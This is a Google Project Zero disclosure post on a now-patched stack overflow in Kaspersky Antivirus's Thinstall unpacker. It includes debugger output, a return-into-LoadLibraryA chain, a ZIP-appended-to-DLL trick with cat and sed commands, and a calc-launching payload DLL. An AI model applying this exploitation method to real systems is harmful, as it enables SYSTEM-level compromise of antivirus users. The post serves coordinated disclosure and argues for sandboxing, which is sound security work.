# Kaspersky: Mo Unpackers, Mo Problems. - Project Zero

Source: https://projectzero.google/2015/09/kaspersky-mo-unpackers-mo-problems.html
Captured verbatim (article body extracted from HTML) on 2026-11-12.

---

Posted by the notorious Tavis Ormandy.


We’ve talked before about how we use Google scale to amplify our [fuzzing efforts](http://googleonlinesecurity.blogspot.com/2011/08/fuzzing-at-scale.html). I’ve recently been working on applying some of these techniques to Antivirus, a vast and highly privileged attack surface.


Among the products I’m working on is Kaspersky Antivirus, and I’m currently triaging and analyzing the first round of vulnerabilities I’ve collected. As well as fuzzing, I’ve been auditing and reviewing the design, resulting in identifying multiple major flaws that Kaspersky are actively working on resolving. These issues affect everything from network intrusion detection, ssl interception and file scanning to browser integration and local privilege escalation.


Many of the reports I’ve filed are still unfixed, but Kaspersky has made enough progress that I can talk about some of the issues. One notable observation from this work was that some of the most critical vulnerabilities I’ve been submitting were simply too easy to exploit, and I’m happy to report that Kaspersky are rolling out some improved mitigations to resolve that.


Some of the bugs Kaspersky has already [resolved](http://support.kaspersky.com/common/vulnerability.aspx?el=12430) include vulnerabilities parsing everything from [Android DEX](https://code.google.com/p/google-security-research/issues/detail?id=519) files and [Microsoft CHM](https://code.google.com/p/google-security-research/issues/detail?id=524) documents to unpacking [UPX](https://code.google.com/p/google-security-research/issues/detail?id=527) and [Yoda’s Protector](https://code.google.com/p/google-security-research/issues/detail?id=528). We’ve sent dozens of reports to Kaspersky to investigate, any of which could result in a complete compromise of any Kaspersky Antivirus user.


Let’s examine one of the issues in more detail. For this first issue, if the release date of the definitions in Kaspersky Antivirus (or any other products using the Kaspersky engine, such as ZoneAlarm) is after 7-Sep-2015, then the vulnerability described below is already resolved.


Because antivirus products typically intercept filesystem and network traffic, simply visiting a website or receiving an email is sufficient for exploitation. It is not necessary to open or read the email, as the filesystem I/O from receiving the email is sufficient to trigger the exploitable condition.


Sample Vulnerability: Thinstall Containers


Thinstall containers are virtualization wrappers around applications to simplify distribution. The product was acquired by VMware in 2008 and renamed [VMware ThinApp](https://www.vmware.com/products/thinapp). Kaspersky attempts to unpack thinstall version 4 containers to scan the contents when it encounters one. Thinstall applications can be recognised by the magic constants at their entry point.


| pushf pusha push 0x6C417453 push 0x6E496854 call $+5 | 
| This code triggers the thinstall unpacker in Kaspersky. | 


Fuzzing thinstall applications revealed a stack buffer overflow extracting the container contents. Because Kaspersky did not enable [/GS](https://msdn.microsoft.com/en-us/library/8dbf701c.aspx), it is possible to overwrite the stack frame and redirect execution quite simply. Support for /GS was first introduced in Visual Studio 2002, and has been enabled by default for many years. It is possible to disable /GS in your build configuration, but it would be an exceptionally bad idea to do so.


By extracting the container record responsible for the overflow, it didn’t take long to reliably gain control of the instruction pointer.


(8f0.b28): Access violation - code c0000005 (first chance)

First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

eax=00000001 ebx=0be4005c ecx=09f9d810 edx=00000000 esi=0be4005c edi=0d90ef64

eip=41414141 esp=09f9dc5c ebp=43434343 iopl=0         nv up ei pl nz na pe cy

cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207

41414141 ??              ???

0:084> lmv m avp

start    end        module name

013d0000 01401000   avp        (deferred)             

Image path: C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 16.0.0\avp.exe

Image name: avp.exe

Timestamp:        Thu Jul 23 11:39:44 2015 (55B134F0)

CheckSum:         00036438

ImageSize:        00031000

File version:     16.0.0.625

Product version:  16.0.0.625

File flags:       0 (Mask 3F)

File OS:          40004 NT Win32

File type:        1.0 App

File date:        00000000.00000000

Translations:     0409.04b0

CompanyName:      Kaspersky Lab ZAO

ProductName:      Kaspersky Anti-Virus

InternalName:     avp

OriginalFilename: avp.exe

ProductVersion:   16.0.0.625

FileVersion:      16.0.0.625

FileDescription:  Kaspersky Anti-Virus

LegalCopyright:   © 2015 Kaspersky Lab ZAO. All Rights Reserved.

LegalTrademarks:  Registered trademarks and service marks are the property of their respective owners



Exploitation


Kaspersky have enabled /DYNAMICBASE for all of their modules which should make exploitation unreliable. Unfortunately, a few implementation flaws prevented it from working properly. Multiple PAGE\_EXECUTE\_READWRITE mappings are created at predictable locations for dynamic code using VirtualAlloc().


0:117> !address 0x7e670000

Usage:                  \<unknown>

Base Address:           7e670000

End Address:            7e671000

Region Size:            00001000

State:                  00001000 MEM\_COMMIT

Protect:                00000040 PAGE\_EXECUTE\_READWRITE

Type:                   00020000 MEM\_PRIVATE

Allocation Base:        7e670000

Allocation Protect:     00000040 PAGE\_EXECUTE\_READWRITE


I dumped the contents of the pages using .writemem, and quickly found a stub for calling kernel32!LoadLibraryA.


0:001> u 0x7e670470

7e670470 58              pop     eax

7e670471 688f49db76      push    offset kernel32!LoadLibraryA (76db498f)

7e670476 c3              ret

7e670477 cc              int     3

7e670478 55              push    ebp

7e670479 8bec            mov     ebp,esp

7e67047b 81ecb0000000    sub     esp,0B0h

7e670481 833d5cff686800  cmp     dword ptr \[ushata!UshataInitializeForService+0x1639c (6868ff5c)\],0


This would be a useful primitive for exploitation if we could control the parameters, but there is no way to know where any useful strings are located. I guessed that the filename that’s being scanned must be somewhere on the stack. After dumping the stack with dda I found it at \[esp+0x8f\*4\].


0:124> dda esp+8e\*4 L1

0c85e4cc  0ba21fb8 "C:\exploit.txt"


Note that the filename or extension being scanned doesn’t matter, I used .txt.


If I could get the exploit to look like a valid DLL, I could return into LoadLibrary and get it to invoke DllMain(). This code would then be loaded into the address space of avp.exe and execute with NT AUTHORITY\SYSTEM privileges.


I built a simple chain to clear the stack and return into LoadLibraryA, and it worked beautifully.


0:124> dda esp L8f

0c85e294  00000000

0c85e298  7e670471 "h.I.v..U....."

0c85e29c  00000000

0c85e2a0  7e670471 "h.I.v..U....."

0c85e2a4  00000000

0c85e2a8  7e670471 "h.I.v..U....."

0c85e2ac  00000000

0c85e4c8  7e670471 "h.I.v..U....."

...

0c85e4cc  0ba21fb8 "C:\exploit.txt"


Unfortunately the Windows loader is very strict about the format of DLL’s, and I was unable to get it to accept the exploit and still trigger the vulnerability in Kaspersky. This might be possible given more time, but I came up with an alternative strategy instead.


Channelling Corkami


I had already noticed that Kaspersky will scan archives appended to other files.


$ cat file.doc file.zip > newfile.doc


So in this case, Kaspersky would spot that a ZIP archive had been appended to a office document, and extract and scan the contents. I wondered if it was possible to put my exploit in a ZIP file, and then append it to a DLL, like this:


$ cat payload.dll exploit.zip > finalexploit.txt


This would mean Kaspersky would see the ZIP file appended to the DLL and then scan my exploit, but Windows would see a valid DLL. Note that filenames and extensions don’t matter here, it is perfectly legal to LoadLibrary(“anything.txt”).


I was able to trigger the exploit this way, but unfortunately the filename on the stack was now written differently! When scanning inside an archive Kaspersky renders the filename like this:


C:\exploit.zip//exploit.txt


That is not a pathname that LoadLibraryA would accept. My solution was to modify the zip header to name the file “”, i.e. an empty string, when Kaspersky produces the filename it appends the empty string and the filename is still a valid target for LoadLibraryA.


I just used sed like this:


$ sed -i 's/e$xploit.txt$/\x00\1/' exploit.zip


I wrote a quick payload dll to load:


$ cat wrapper.c 

#include \<windows.h>


#pragma comment(lib, "shell32")


BOOLEAN WINAPI DllMain(HINSTANCE hDllHandle, DWORD nReason, LPVOID Reserved)

{

ShellExecute(NULL, "open", "calc", NULL, NULL, 0);

ExitProcess(0);

return 1;

}


And the exploit worked beautifully first time.


I verified the exploit worked on version 15 and 16 of Kaspersky Antivirus on Windows 7. Note that the calculator is displayed on the Service Desktop, so you will need to use Process Explorer to verify it was created.


Product Design Flaws


I’ve also reported some major design flaws in various other components of Kaspersky Antivirus and Kaspersky Internet Security. The patches for the remote network attacks I had planned to discuss here were delayed, and so I’ll talk about them in a second post on this topic once the fixes are live.


Security  Software Considered Harmful?


We have strong evidence that an active black market trade in antivirus exploits exists. Research shows that it’s an easily accessible attack surface that dramatically increases exposure to targeted attacks.


|   | 
| Snippet of an exploit pricelist uncovered by WikiLeaks, [source](https://wikileaks.org/hackingteam/emails/emailid/71862). The pricelist demonstrates that anti virus exploits and information  are actively traded. | 


For this reason, the vendors of security products have a responsibility to uphold the highest secure development standards possible to minimise the potential for harm caused by their software.


Ignoring the question of efficacy, attempting to reduce one’s exposure to opportunistic malware should not result in an increased exposure to targeted attacks.


Conclusion


In future, we would like to see antivirus unpackers, emulators and parsers sandboxed, not run with SYSTEM privileges. The [chromium sandbox](https://www.chromium.org/developers/design-documents/sandbox) is [open source](https://code.google.com/p/chromium/codesearch#chromium/src/sandbox/win/&sq=package:chromium) and used in multiple major products. Don’t wait for the network worm that targets your product, or for targeted attacks against your users, add sandboxing to your development roadmap today.


Thanks to Kaspersky for record breaking response times when handling this report, they’ve set a high bar to beat for other vendors! More Kaspersky issues, including multiple remote code execution vulnerabilities, should be fixed and visible in our issue tracker over the next few weeks.
